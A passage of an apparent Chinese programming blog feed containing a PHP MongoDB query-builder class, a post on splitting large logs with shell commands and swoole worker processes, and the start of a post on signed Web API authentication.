class="line"></span><br><span class="line">    public function drop()</span><br><span class="line">    &#123;</span><br><span class="line">        $cmd &#x3D; array(</span><br><span class="line">            &#39;drop&#39; &#x3D;&gt; $this-&gt;collection,</span><br><span class="line">        );</span><br><span class="line">        $db &#x3D; $this-&gt;database;</span><br><span class="line">        $commands &#x3D; new \\MongoDB\\Driver\\Command($cmd);</span><br><span class="line">        $cursor &#x3D; $this-&gt;command($db, $commands);</span><br><span class="line">        $this-&gt;result &#x3D; $cursor;</span><br><span class="line">        $response &#x3D; current($cursor-&gt;toArray());</span><br><span class="line">        return $response;</span><br><span class="line">    &#125;</span><br><span class="line">    public function createCollections()</span><br><span class="line">    &#123;</span><br><span class="line">        $cmd &#x3D; array(</span><br><span class="line">            &#39;create&#39; &#x3D;&gt; $this-&gt;collection,</span><br><span class="line">        );</span><br><span class="line">        $db &#x3D; $this-&gt;database;</span><br><span class="line">        $commands &#x3D; new \\MongoDB\\Driver\\Command($cmd);</span><br><span class="line">        $cursor &#x3D; $this-&gt;command($db, $commands);</span><br><span class="line">        $this-&gt;result &#x3D; $cursor;</span><br><span class="line">        $response &#x3D; current($cursor-&gt;toArray());</span><br><span class="line">        return $response;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F;unique</span><br><span class="line">    public function add_index($key, $name &#x3D; &#39;index&#39;)</span><br><span class="line">    &#123;</span><br><span class="line">        $cmd &#x3D; array(</span><br><span class="line">            &#39;createIndexes&#39; &#x3D;&gt; $this-&gt;collection,</span><br><span class="line">            &#39;indexes&#39; &#x3D;&gt; array(</span><br><span class="line">                array(</span><br><span class="line">                    &#39;name&#39; &#x3D;&gt; $name,</span><br><span class="line">                    &#39;key&#39; &#x3D;&gt; $key,</span><br><span class="line">                )</span><br><span class="line">            )</span><br><span class="line">        );</span><br><span class="line">        $db &#x3D; $this-&gt;database;</span><br><span class="line">        $commands &#x3D; new \\MongoDB\\Driver\\Command($cmd);</span><br><span class="line">        $cursor &#x3D; $this-&gt;command($db, $commands);</span><br><span class="line">        $this-&gt;result &#x3D; $cursor;</span><br><span class="line">        $response &#x3D; current($cursor-&gt;toArray());</span><br><span class="line">        return $response;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function remove_index($index)</span><br><span class="line">    &#123;</span><br><span class="line">        $cmd &#x3D; array(</span><br><span class="line">            &#39;dropIndexes&#39; &#x3D;&gt; $this-&gt;collection,</span><br><span class="line">            &#39;index&#39; &#x3D;&gt; $index</span><br><span class="line">        );</span><br><span class="line">        $db &#x3D; $this-&gt;database;</span><br><span class="line">        $commands &#x3D; new \\MongoDB\\Driver\\Command($cmd);</span><br><span class="line">        $cursor &#x3D; $this-&gt;command($db, $commands);</span><br><span class="line">        $this-&gt;result &#x3D; $cursor;</span><br><span class="line">        $response &#x3D; current($cursor-&gt;toArray());</span><br><span class="line">        return $response;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function list_indexes()</span><br><span class="line">    &#123;</span><br><span class="line">        $cmd &#x3D; array(</span><br><span class="line">            &#39;listIndexes&#39; &#x3D;&gt; $this-&gt;collection,</span><br><span class="line">        );</span><br><span class="line">        $db &#x3D; $this-&gt;database;</span><br><span class="line">        $commands &#x3D; new \\MongoDB\\Driver\\Command($cmd);</span><br><span class="line">        $cursor &#x3D; $this-&gt;command($db, $commands);</span><br><span class="line">        $this-&gt;result &#x3D; $cursor;</span><br><span class="line">        return $cursor;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function aggregate($commands, $allowDiskUse &#x3D; false)</span><br><span class="line">    &#123;</span><br><span class="line">        $db &#x3D; $this-&gt;database;</span><br><span class="line">        $sql &#x3D; \[</span><br><span class="line">            &#39;aggregate&#39; &#x3D;&gt; $this-&gt;collection,</span><br><span class="line">            &#39;pipeline&#39; &#x3D;&gt; $commands,</span><br><span class="line">            &#39;allowDiskUse&#39; &#x3D;&gt; $allowDiskUse,</span><br><span class="line">        \];</span><br><span class="line"></span><br><span class="line">        $commands &#x3D; new \\MongoDB\\Driver\\Command($sql);</span><br><span class="line">        $cursor &#x3D; $this-&gt;command($db, $commands);</span><br><span class="line">        $this-&gt;result &#x3D; $cursor;</span><br><span class="line">        $response &#x3D; current($cursor-&gt;toArray())-&gt;result;</span><br><span class="line">        return $response;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;**</span><br><span class="line">     * @param $key</span><br><span class="line">     * @return mixed</span><br><span class="line">     *&#x2F;</span><br><span class="line">    public function distinct($key)</span><br><span class="line">    &#123;</span><br><span class="line">        $db &#x3D; $this-&gt;database;</span><br><span class="line">        $commands &#x3D; new \\MongoDB\\Driver\\Command(</span><br><span class="line">            \[</span><br><span class="line">                &#39;distinct&#39; &#x3D;&gt; $this-&gt;collection,</span><br><span class="line">                &#39;key&#39; &#x3D;&gt; $key,</span><br><span class="line">                &#39;query&#39; &#x3D;&gt; $this-&gt;wheres</span><br><span class="line">            \]</span><br><span class="line">        );</span><br><span class="line">        $cursor &#x3D; $this-&gt;command($db, $commands);</span><br><span class="line">        $this-&gt;result &#x3D; $cursor;</span><br><span class="line">        $response &#x3D; current($cursor-&gt;toArray())-&gt;values;</span><br><span class="line">        return $response;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;**</span><br><span class="line">     * count</span><br><span class="line">     * @return mixed</span><br><span class="line">     *&#x2F;</span><br><span class="line">    public function count()</span><br><span class="line">    &#123;</span><br><span class="line">        $db &#x3D; $this-&gt;database;</span><br><span class="line">        $commands &#x3D; new \\MongoDB\\Driver\\Command(</span><br><span class="line">            \[</span><br><span class="line">                &quot;count&quot; &#x3D;&gt; $this-&gt;collection,</span><br><span class="line">                &quot;query&quot; &#x3D;&gt; $this-&gt;wheres</span><br><span class="line">            \]</span><br><span class="line">        );</span><br><span class="line">        $cursor &#x3D; $this-&gt;command($db, $commands);</span><br><span class="line">        $this-&gt;result &#x3D; $cursor;</span><br><span class="line">        $response &#x3D; $cursor-&gt;toArray()\[0\];</span><br><span class="line">        return $response-&gt;n;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;**</span><br><span class="line">     * 查</span><br><span class="line">     * @return mixed</span><br><span class="line">     *&#x2F;</span><br><span class="line">    public function get()</span><br><span class="line">    &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            $filter &#x3D; (array)$this-&gt;wheres;</span><br><span class="line">            $options &#x3D; \[</span><br><span class="line">                &#39;projection&#39; &#x3D;&gt; (array)$this-&gt;selects,</span><br><span class="line">                &quot;sort&quot; &#x3D;&gt; (array)$this-&gt;sorts,</span><br><span class="line">                &quot;skip&quot; &#x3D;&gt; (int)$this-&gt;offset,</span><br><span class="line">                &quot;limit&quot; &#x3D;&gt; (int)$this-&gt;limit,</span><br><span class="line">            \];</span><br><span class="line">            $query &#x3D; new \\MongoDB\\Driver\\Query($filter, $options);</span><br><span class="line">            $dbc &#x3D; $this-&gt;database . &#39;.&#39; . $this-&gt;collection;</span><br><span class="line">            $documents &#x3D; $this-&gt;manager-&gt;executeQuery($dbc, $query);</span><br><span class="line">            $this-&gt;result &#x3D; $documents;</span><br><span class="line">            $returns &#x3D; array();</span><br><span class="line">            foreach ($documents as $document) &#123;</span><br><span class="line">                $bson &#x3D; \\MongoDB\\BSON\\fromPHP($document);</span><br><span class="line">                $returns\[\] &#x3D; json_decode(\\MongoDB\\BSON\\toJSON($bson), true);</span><br><span class="line">            &#125;</span><br><span class="line">            return $returns;</span><br><span class="line">        &#125; catch (\\Exception $e) &#123;</span><br><span class="line">            $this-&gt;showError($e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;**</span><br><span class="line">     * @param $fields</span><br><span class="line">     * @param null $value</span><br><span class="line">     * @return $this</span><br><span class="line">     *&#x2F;</span><br><span class="line">    public function set($fields, $value &#x3D; NULL)</span><br><span class="line">    &#123;</span><br><span class="line">        if (is_string($fields)) &#123;</span><br><span class="line">            $this-&gt;updates\[&#39;$set&#39;\]\[$fields\] &#x3D; $value;</span><br><span class="line">        &#125; elseif (is_array($fields)) &#123;</span><br><span class="line">            foreach ($fields as $field &#x3D;&gt; $value) &#123;</span><br><span class="line">                $this-&gt;updates\[&#39;$set&#39;\]\[$field\] &#x3D; $value;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return $this;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;**</span><br><span class="line">     * 要获取的字段</span><br><span class="line">     * @param $wheres</span><br><span class="line">     * @param null $value</span><br><span class="line">     * @return $this</span><br><span class="line">     *&#x2F;</span><br><span class="line">    public function field($includes &#x3D; array(), $excludes &#x3D; array())</span><br><span class="line">    &#123;</span><br><span class="line">        if (!is_array($includes)) &#123;</span><br><span class="line">            $includes &#x3D; array();</span><br><span class="line">        &#125;</span><br><span class="line">        if (!is_array($excludes)) &#123;</span><br><span class="line">            $excludes &#x3D; array();</span><br><span class="line">        &#125;</span><br><span class="line">        if (!empty($includes)) &#123;</span><br><span class="line">            foreach ($includes as $col) &#123;</span><br><span class="line">                $this-&gt;selects\[$col\] &#x3D; 1;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        if (!empty($excludes)) &#123;</span><br><span class="line">            foreach ($excludes as $col) &#123;</span><br><span class="line">                $this-&gt;selects\[$col\] &#x3D; 0;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return $this;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;**</span><br><span class="line">     * 条件</span><br><span class="line">     * @param $wheres</span><br><span class="line">     * @param null $value</span><br><span class="line">     * @return $this</span><br><span class="line">     *&#x2F;</span><br><span class="line">    public function where($wheres, $value &#x3D; null)</span><br><span class="line">    &#123;</span><br><span class="line">        if (is_array($wheres)) &#123;</span><br><span class="line">            foreach ($wheres as $wh &#x3D;&gt; $val) &#123;</span><br><span class="line">                $this-&gt;wheres\[$wh\] &#x3D; $val;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $this-&gt;wheres\[$wheres\] &#x3D; $value;</span><br><span class="line">        &#125;</span><br><span class="line">        return $this;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function where_in($field &#x3D; &quot;&quot;, $in &#x3D; array())</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;wheres\[$field\]\[&#39;$in&#39;\] &#x3D; $in;</span><br><span class="line">        return $this;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function where\_in\_all($field &#x3D; &quot;&quot;, $in &#x3D; array())</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;wheres\[$field\]\[&#39;$all&#39;\] &#x3D; $in;</span><br><span class="line">        return $this;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function where_or($wheres &#x3D; array())</span><br><span class="line">    &#123;</span><br><span class="line">        foreach ($wheres as $wh &#x3D;&gt; $val) &#123;</span><br><span class="line">            $this-&gt;wheres\[&#39;$or&#39;\]\[\] &#x3D; array($wh &#x3D;&gt; $val);</span><br><span class="line">        &#125;</span><br><span class="line">        return $this;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    public function where\_not\_in($field &#x3D; &quot;&quot;, $in &#x3D; array())</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;wheres\[$field\]\[&#39;$nin&#39;\] &#x3D; $in;</span><br><span class="line">        return $this;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function where_gt($field &#x3D; &quot;&quot;, $x)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;wheres\[$field\]\[&#39;$gt&#39;\] &#x3D; $x;</span><br><span class="line">        return $this;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function where_gte($field &#x3D; &quot;&quot;, $x)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;wheres\[$field\]\[&#39;$gte&#39;\] &#x3D; $x;</span><br><span class="line">        return $this;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function where_lt($field &#x3D; &quot;&quot;, $x)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;wheres\[$field\]\[&#39;$lt&#39;\] &#x3D; $x;</span><br><span class="line">        return $this;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function where_lte($field &#x3D; &quot;&quot;, $x)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;wheres\[$field\]\[&#39;$lte&#39;\] &#x3D; $x;</span><br><span class="line">        return $this;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function where_between($field &#x3D; &quot;&quot;, $x, $y)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;wheres\[$field\]\[&#39;$gte&#39;\] &#x3D; $x;</span><br><span class="line">        $this-&gt;wheres\[$field\]\[&#39;$lte&#39;\] &#x3D; $y;</span><br><span class="line">        return $this;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function where\_between\_ne($field &#x3D; &quot;&quot;, $x, $y)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;wheres\[$field\]\[&#39;$gt&#39;\] &#x3D; $x;</span><br><span class="line">        $this-&gt;wheres\[$field\]\[&#39;$lt&#39;\] &#x3D; $y;</span><br><span class="line">        return $this;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function where_ne($field &#x3D; &#39;&#39;, $x)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;wheres\[$field\]\[&#39;$ne&#39;\] &#x3D; $x;</span><br><span class="line">        return $this;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function push($fields, $value &#x3D; array())</span><br><span class="line">    &#123;</span><br><span class="line">        if (is_string($fields)) &#123;</span><br><span class="line">            $this-&gt;updates\[&#39;$push&#39;\]\[$fields\] &#x3D; $value;</span><br><span class="line">        &#125; elseif (is_array($fields)) &#123;</span><br><span class="line">            foreach ($fields as $field &#x3D;&gt; $value) &#123;</span><br><span class="line">                $this-&gt;updates\[&#39;$push&#39;\]\[$field\] &#x3D; $value;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return $this;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function addtoset($field, $values)</span><br><span class="line">    &#123;</span><br><span class="line">        if (is_string($values)) &#123;</span><br><span class="line">            $this-&gt;updates\[&#39;$addToSet&#39;\]\[$field\] &#x3D; $values;</span><br><span class="line">        &#125; elseif (is_array($values)) &#123;</span><br><span class="line">            $this-&gt;updates\[&#39;$addToSet&#39;\]\[$field\] &#x3D; array(&#39;$each&#39; &#x3D;&gt; $values);</span><br><span class="line">        &#125;</span><br><span class="line">        return $this;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function pop($field)</span><br><span class="line">    &#123;</span><br><span class="line">        if (is_string($field)) &#123;</span><br><span class="line">            $this-&gt;updates\[&#39;$pop&#39;\]\[$field\] &#x3D; -1;</span><br><span class="line">        &#125; elseif (is_array($field)) &#123;</span><br><span class="line">            foreach ($field as $pop_field) &#123;</span><br><span class="line">                $this-&gt;updates\[&#39;$pop&#39;\]\[$pop_field\] &#x3D; -1;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return $this;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function pull($field &#x3D; &quot;&quot;, $value &#x3D; array())</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;updates\[&#39;$pull&#39;\] &#x3D; array($field &#x3D;&gt; $value);</span><br><span class="line">        return $this;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function rename_field($old, $new)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;updates\[&#39;$rename&#39;\] &#x3D; array($old &#x3D;&gt; $new);</span><br><span class="line">        return $this;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function unset_field($fields)</span><br><span class="line">    &#123;</span><br><span class="line">        if (is_string($fields)) &#123;</span><br><span class="line">            $this-&gt;updates\[&#39;$unset&#39;\]\[$fields\] &#x3D; 1;</span><br><span class="line">        &#125; elseif (is_array($fields)) &#123;</span><br><span class="line">            foreach ($fields as $field) &#123;</span><br><span class="line">                $this-&gt;updates\[&#39;$unset&#39;\]\[$field\] &#x3D; 1;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return $this;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function inc($fields &#x3D; array(), $value &#x3D; 0)</span><br><span class="line">    &#123;</span><br><span class="line">        if (is_string($fields)) &#123;</span><br><span class="line">            $this-&gt;updates\[&#39;$inc&#39;\]\[$fields\] &#x3D; $value;</span><br><span class="line">        &#125; elseif (is_array($fields)) &#123;</span><br><span class="line">            foreach ($fields as $field &#x3D;&gt; $value) &#123;</span><br><span class="line">                $this-&gt;updates\[&#39;$inc&#39;\]\[$field\] &#x3D; $value;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return $this;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function mul($fields &#x3D; array(), $value &#x3D; 0)</span><br><span class="line">    &#123;</span><br><span class="line">        if (is_string($fields)) &#123;</span><br><span class="line">            $this-&gt;updates\[&#39;$mul&#39;\]\[$fields\] &#x3D; $value;</span><br><span class="line">        &#125; elseif (is_array($fields)) &#123;</span><br><span class="line">            foreach ($fields as $field &#x3D;&gt; $value) &#123;</span><br><span class="line">                $this-&gt;updates\[&#39;$mul&#39;\]\[$field\] &#x3D; $value;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return $this;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function max($fields &#x3D; array(), $value &#x3D; 0)</span><br><span class="line">    &#123;</span><br><span class="line">        if (is_string($fields)) &#123;</span><br><span class="line">            $this-&gt;updates\[&#39;$max&#39;\]\[$fields\] &#x3D; $value;</span><br><span class="line">        &#125; elseif (is_array($fields)) &#123;</span><br><span class="line">            foreach ($fields as $field &#x3D;&gt; $value) &#123;</span><br><span class="line">                $this-&gt;updates\[&#39;$max&#39;\]\[$field\] &#x3D; $value;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return $this;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function min($fields &#x3D; array(), $value &#x3D; 0)</span><br><span class="line">    &#123;</span><br><span class="line">        if (is_string($fields)) &#123;</span><br><span class="line">            $this-&gt;updates\[&#39;$min&#39;\]\[$fields\] &#x3D; $value;</span><br><span class="line">        &#125; elseif (is_array($fields)) &#123;</span><br><span class="line">            foreach ($fields as $field &#x3D;&gt; $value) &#123;</span><br><span class="line">                $this-&gt;updates\[&#39;$min&#39;\]\[$field\] &#x3D; $value;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return $this;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;**</span><br><span class="line">     * 排序</span><br><span class="line">     * @param array $fields</span><br><span class="line">     * @return $this</span><br><span class="line">     *&#x2F;</span><br><span class="line">    public function order_by($fields &#x3D; array())</span><br><span class="line">    &#123;</span><br><span class="line">        foreach ($fields as $col &#x3D;&gt; $val) &#123;</span><br><span class="line">            if ($val &#x3D;&#x3D; -1 || $val &#x3D;&#x3D;&#x3D; FALSE || strtolower($val) &#x3D;&#x3D; &#39;desc&#39;) &#123;</span><br><span class="line">                $this-&gt;sorts\[$col\] &#x3D; -1;</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                $this-&gt;sorts\[$col\] &#x3D; 1;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return $this;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;**</span><br><span class="line">     * 条数</span><br><span class="line">     * @param int $x</span><br><span class="line">     * @return $this</span><br><span class="line">     *&#x2F;</span><br><span class="line">    public function limit($x &#x3D; 99999)</span><br><span class="line">    &#123;</span><br><span class="line">        if ($x !&#x3D;&#x3D; NULL &amp;&amp; is_numeric($x) &amp;&amp; $x &gt;&#x3D; 1) &#123;</span><br><span class="line">            $this-&gt;limit &#x3D; (int)$x;</span><br><span class="line">        &#125;</span><br><span class="line">        return $this;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;**</span><br><span class="line">     * 偏移量</span><br><span class="line">     * @param int $x</span><br><span class="line">     * @return $this</span><br><span class="line">     *&#x2F;</span><br><span class="line">    public function offset($x &#x3D; 0)</span><br><span class="line">    &#123;</span><br><span class="line">        if ($x !&#x3D;&#x3D; NULL &amp;&amp; is_numeric($x) &amp;&amp; $x &gt;&#x3D; 1) &#123;</span><br><span class="line">            $this-&gt;offset &#x3D; (int)$x;</span><br><span class="line">        &#125;</span><br><span class="line">        return $this;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;**</span><br><span class="line">     * 生成mongo时间</span><br><span class="line">     * @param bool $stamp</span><br><span class="line">     * @return \\MongoDB\\BSON\\UTCDatetime</span><br><span class="line">     *&#x2F;</span><br><span class="line">    public function date($stamp &#x3D; false)</span><br><span class="line">    &#123;</span><br><span class="line">        if ($stamp &#x3D;&#x3D; false) &#123;</span><br><span class="line">            return new \\MongoDB\\BSON\\UTCDatetime(time() * 1000);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            return new \\MongoDB\\BSON\\UTCDatetime($stamp);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;**</span><br><span class="line">     * 生成mongo时间戳</span><br><span class="line">     * @param bool $stamp</span><br><span class="line">     * @return \\MongoDB\\BSON\\Timestamp</span><br><span class="line">     *&#x2F;</span><br><span class="line">    public function timestamp($stamp &#x3D; false)</span><br><span class="line">    &#123;</span><br><span class="line">        if ($stamp &#x3D;&#x3D; false) &#123;</span><br><span class="line">            return new \\MongoDB\\BSON\\Timestamp(0, time());</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            return new \\MongoDB\\BSON\\Timestamp(0, $stamp);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;**</span><br><span class="line">     * 抛出异常</span><br><span class="line">     * @param $e</span><br><span class="line">     *&#x2F;</span><br><span class="line">    public function showError($e)</span><br><span class="line">    &#123;</span><br><span class="line">        exit($e-&gt;getMessage());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>MongoDB</category>
        <category>数据库</category>
        <category>编程</category>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>MongoDB</tag>
        <tag>PHP</tag>
        <tag>PHP7</tag>
      </tags>
  </entry>
  <entry>
    <title>php快速分析日志</title>
    <url>/2017/02/13/php%E5%BF%AB%E9%80%9F%E5%88%86%E6%9E%90%E6%97%A5%E5%BF%97/</url>
    <content><![CDATA[<p>在一个跑数任务（读取服务器日志分析数据）中，如果日志内容数据量过大会导致耗时特别长，比如一个小时的压缩日志大约1G，用php去读取可能要半个多小时， 那怎么解决这种问题呢？上代码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;**</span><br><span class="line"> * 把dcclog解压拆分成10个文件</span><br><span class="line"> * @param $file</span><br><span class="line"> * @return bool</span><br><span class="line"> * @author fengqiang@yiche.com</span><br><span class="line"> *&#x2F;</span><br><span class="line">public static function splitGzFile($file)</span><br><span class="line">&#123;</span><br><span class="line">    &#x2F;&#x2F; 解压文件</span><br><span class="line">    $shell_1 &#x3D; &quot;gunzip $file&quot;;</span><br><span class="line">    exec($shell_1);</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F;拆分成10个解压文件</span><br><span class="line">    $file &#x3D; rtrim($file, &#39;.gz&#39;);</span><br><span class="line">    if(file_exists($file))</span><br><span class="line">    &#123;</span><br><span class="line">        $size &#x3D; filesize($file);</span><br><span class="line">        $oneSize &#x3D; ceil($size&#x2F;1024&#x2F;1024&#x2F;9); &#x2F;&#x2F;拆分成10个文件，每个文件大小 单位M</span><br><span class="line">        $lines &#x3D; $oneSize * 820; &#x2F;&#x2F;经过测试大概802行&#x2F;M</span><br><span class="line"></span><br><span class="line">        $shell &#x3D; &quot;split -l &#123;$lines&#125; -d &#123;$file&#125; &#123;$file&#125;.&quot;; &#x2F;&#x2F;shell拆分文件</span><br><span class="line">        exec($shell);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;            unlink($file); &#x2F;&#x2F;已切割文件 删除解压的文件</span><br><span class="line">    &#125;</span><br><span class="line">    return true;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>shell中有个split命令，可以按行拆分文件，然后可以对文件分下，大概估算下当前日志多少行为1M，按此切割。 这个时候日志已经拆分成十个文件，我们可以应用<a href="http://onwise.xyz/?p=70">swoole多进程</a>去读取日志，分析数据。  </p>
<p>/行为日志单独处理 把文件拆分十个 用十个进程去跑</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">swoole_process</span><br><span class="line">$dataArr &#x3D; FilesDcclog::dofiles\_hour\_new($time);</span><br><span class="line">if(is_array($dataArr))</span><br><span class="line">&#123;</span><br><span class="line">    for($i &#x3D; 0; $i&lt;10; $i++)</span><br><span class="line">    &#123;</span><br><span class="line">        $i &#x3D; sprintf(&quot;%02d&quot;, $i);</span><br><span class="line">        $str &#x3D; &quot;&#123;$dataArr\[0\]&#125;.&#123;$i&#125;||&#123;$dataArr\[1\]&#125;||&#123;$time&#125;||&#123;$doHour&#125;&quot;;</span><br><span class="line">        $process &#x3D; new swoole\_process(&#39;worker\_dcclog&#39;);</span><br><span class="line">        $pid &#x3D; $process-&gt;start();</span><br><span class="line">        $process-&gt;write($str); &#x2F;&#x2F;进程通信</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;回收进程</span><br><span class="line">while(1)&#123;</span><br><span class="line">    $ret &#x3D; swoole_process::wait();</span><br><span class="line">    if ($ret)&#123;&#x2F;&#x2F; $ret 是个数组 code是进程退出状态码，</span><br><span class="line">        $pid &#x3D; $ret\[&#39;pid&#39;\];</span><br><span class="line">        err_log(&quot;进程&#123;$ret\[&#39;pid&#39;\]&#125;回收成功&quot;, atFLAG);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        break;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">function worker\_dcclog(swoole\_process $worker)</span><br><span class="line">&#123;</span><br><span class="line">    $str &#x3D; $worker-&gt;read();</span><br><span class="line">    $params &#x3D; explode(&quot;||&quot;, $str);</span><br><span class="line">    $jsonworker &#x3D; json_encode((array)$worker);</span><br><span class="line">    err\_log(&quot;callback\_file worker info &#123;$jsonworker&#125;&quot;, atFLAG);</span><br><span class="line">    if(file_exists($params\[0\]))</span><br><span class="line">    &#123;</span><br><span class="line">        err_log(&quot;start:: log:&quot;.$params\[0\].&quot;||time:&quot;.$params\[2\].&quot;||dohour:&quot;.$params\[3\], prFLAG);</span><br><span class="line">        FilesDcclog::formatData2PutJsonFile($params\[0\], $params\[1\], $params\[2\], $worker-&gt;pid);&#x2F;&#x2F;根据所需调用自己的处理方法</span><br><span class="line">        err_log(&quot;end:: log:&quot;.$params\[0\].&quot;||time:&quot;.$params\[2\].&quot;||dohour:&quot;.$params\[3\], prFLAG);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这样我们就能就会大大提高任务的时效性，经测试时间大概5<del>8分钟处理完任务，加快了5</del>6倍。 另外在此基础上，还能通过应用PHP7来再次提高效率，<a href="http://onwise.xyz/?p=112">PHP7</a>读取文件会比PHP5快速更多。</p>
<p><strong>可能遇到的问题：</strong></p>
<p>在php.ini中把禁用函数选项中的disable_functions中的exec去掉，否则会报错，不能使用exec函数。</p>
]]></content>
      <categories>
        <category>编程</category>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>PHP</tag>
        <tag>PHP7</tag>
      </tags>
  </entry>
  <entry>
    <title>WEB API加密认证</title>
    <url>/2017/02/13/web-api%E5%8A%A0%E5%AF%86%E8%AE%A4%E8%AF%81/</url>
    <content><![CDATA[<p><strong>WEB API接口加密认证：</strong></p>
<ol>
<li><p>假设我们需要访问的API接口是这样的：<a href="http://test.com/openapi/v2/get/user/?key=xxxxx&amp;sign=sadasdas&amp;timestamp=2013-03-05">http://test.com/openapi/v2/get/user/?key=xxxxx&amp;sign=sadasdas&amp;timestamp=2013-03-05</a> 10:14:00&amp;c=c&amp;a=a&amp;d=d</p>
</li>
<li><p>接口调用的控制器：openapi/v2/get/user/</p>
</li>
<li><p>步骤一：作为服务端，首先要检查参数是否正确：key (用户的key) ;sign(加密的签名串) ;timestamp (请求的时间，服务端对请求有时间生效)，这些参数如果有一个参数没传递，肯定返回参数不正确的结果。</p>
</li>
<li><p>步骤二：参数如果都传递正确，这个时候需要检查API的白名单权限，API也就是（openapi/vw/get/user/）是否存在在我们的数据库中，一般会有一张API的数据表，如果调用的API不在我们的数据库白名单中或者这个API已经关闭访问了，那么要返回禁止访问的结果。</p>
</li>
